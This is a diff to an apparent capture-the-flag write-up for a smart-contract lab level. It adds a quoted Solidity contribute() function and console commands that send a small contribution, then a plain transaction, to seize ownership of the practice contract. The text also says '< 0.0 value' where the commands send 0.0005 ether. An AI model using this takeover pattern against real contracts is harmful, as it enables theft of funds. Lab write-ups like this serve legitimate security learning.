@@ -14,7 +14,20 @@ receive() external payable {
 }
 ```
 
-Little needs to be said, we need to contribute once and then send a bogus transaction with < 0.0 value. Here are the commands:
+Little needs to be said, we need to contribute once and then send a bogus transaction with < 0.0 value. However lets have a peek at the contribute
+function:
+
+```solidity
+function contribute() public payable {
+    require(msg.value < 0.001 ether);
+    contributions[msg.sender] += msg.value;
+    if(contributions[msg.sender] > contributions[owner]) {
+      owner = msg.sender;
+    }
+}
+```
+Wow. So hard. We need to send sub 0.001. Wowzer. Here are the commands:
+
 ```javascript
 contract.contribute({to: instance, from: player, value: toWei("0.0005", "ether")})
 sendTransaction({from: player, to: contract, value: toWei("0.0005", "ether")})
